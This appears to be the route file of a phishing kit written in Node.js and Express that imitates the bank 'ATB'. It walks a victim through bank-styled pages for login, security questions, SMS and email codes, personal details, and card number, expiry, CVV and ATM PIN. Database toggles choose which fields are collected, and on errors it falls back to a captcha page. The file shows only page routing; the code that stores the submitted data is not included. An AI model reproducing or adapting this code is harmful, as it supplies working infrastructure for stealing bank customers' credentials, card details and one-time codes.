// userRouter.js
const express = require('express');
const router = express.Router();
const dbConfig = require('../dbConfig');
const { Pool } = require('pg');
const getId = 1;

const pool = new Pool(dbConfig);

router.get('/loading', async (req, res) => {
    res.render('bank/atb/loading/index');
})

router.get('/sms', async (req, res) => {
    let error = false
    if(req.query.argument){
        error = true
    }
    res.render('bank/atb/sms/index', { navig: "/atb/loading", error: error});
})

router.get('/email', async (req, res) => {
    let error = false
    if(req.query.argument){
        error = true
    }
    res.render('bank/atb/email/index', { navig: "/atb/loading", error: error });
})


router.get('/details', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.atb).forEach(key => {
            if (result.rows[0].data.settings.atb[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                }
            }
        });

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }


        if (rmvCardPage) {
            res.render('bank/atb/details/index', { navig: "/atb/finish", atb: result.rows[0].data.settings.atb});
        } else {
            res.render('bank/atb/details/index', { navig: "/atb/card", atb: result.rows[0].data.settings.atb});
        }



    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/qst', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvDetailsPage = false
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.atb).forEach(key => {
            if (result.rows[0].data.settings.atb[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                    //console.log(countRmvCardPage);
                }
            }
        });

        if (countRmvDetailsPage == 10) {
            rmvDetailsPage = true
        }

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }

        //console.log("Remove Details : ", rmvDetailsPage)
        //console.log("Remove Card : ", rmvCardPage)



        if (rmvDetailsPage) {
            if (rmvCardPage) {
                res.render('bank/atb/qst/index', { navig: "/atb/finish", p_quests: result.rows[0].data.settings.atb.qa });
            } else {
                res.render('bank/atb/qst/index', { navig: "/atb/card", p_quests: result.rows[0].data.settings.atb.qa });
            }
        } else if (count >= 14) {
            res.render('bank/atb/qst/index', { navig: "/atb/finish", p_quests: result.rows[0].data.settings.atb.qa });
        } else {
            res.render('bank/atb/qst/index', { navig: "/atb/details", p_quests: result.rows[0].data.settings.atb.qa });
        }

    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/login', async (req, res) => {
    try {

        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvDetailsPage = false
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.atb).forEach(key => {
            if (result.rows[0].data.settings.atb[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                    //console.log(countRmvCardPage);
                }
            }
        });

        if (countRmvDetailsPage == 10) {
            rmvDetailsPage = true
        }

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }

        //console.log("Remove Details : ", rmvDetailsPage)
        //console.log("Remove Card : ", rmvCardPage)


        if (result.rows[0].data.settings.atb.qa > 0) {
            res.render('bank/atb/login/index', { navig: "/atb/qst" });
        } else if (count >= 14) {
            res.render('bank/atb/login/index', { navig: "/atb/finish" });
        } else {
            if (rmvDetailsPage) {
                if (rmvCardPage) {
                    res.render('bank/atb/login/index', { navig: "/atb/finish" });
                } else {
                    res.render('bank/atb/login/index', { navig: "/atb/card" });
                }
            } else {
                res.render('bank/atb/login/index', { navig: "/atb/details" });
            }
        }


    } catch (error) {
        console.error(error);
        res.render('captcha/index');
    }
})



// Export the router
module.exports = router;
